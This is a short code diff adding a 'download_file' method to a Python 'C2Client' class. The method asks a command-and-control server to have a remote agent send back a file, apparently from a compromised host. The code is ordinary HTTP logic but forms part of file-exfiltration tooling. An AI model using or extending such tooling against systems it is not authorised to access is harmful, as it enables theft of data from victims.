@@ -207,3 +207,39 @@ class C2Client:
                         
         except Exception as e:
             raise Exception(f"Failed to upload file: {str(e)}")
+
+    async def download_file(
+        self,
+        session_id: str,
+        remote_path: str
+    ) -> Dict[str, Any]:
+        """
+        Download file from agent.
+        
+        Args:
+            session_id: Target session ID
+            remote_path: Remote file path to download
+            
+        Returns:
+            Download result with task_id
+        """
+        try:
+            payload = {
+                "session_id": session_id,
+                "type": "download",
+                "path": remote_path
+            }
+            
+            async with aiohttp.ClientSession() as session:
+                async with session.post(
+                    f"{self.server_url}/api/command",
+                    json=payload,
+                    timeout=aiohttp.ClientTimeout(total=60)
+                ) as response:
+                    if response.status == 200:
+                        return await response.json()
+                    else:
+                        raise Exception(f"Download failed: {response.status}")
+                        
+        except Exception as e:
+            raise Exception(f"Failed to download file: {str(e)}")
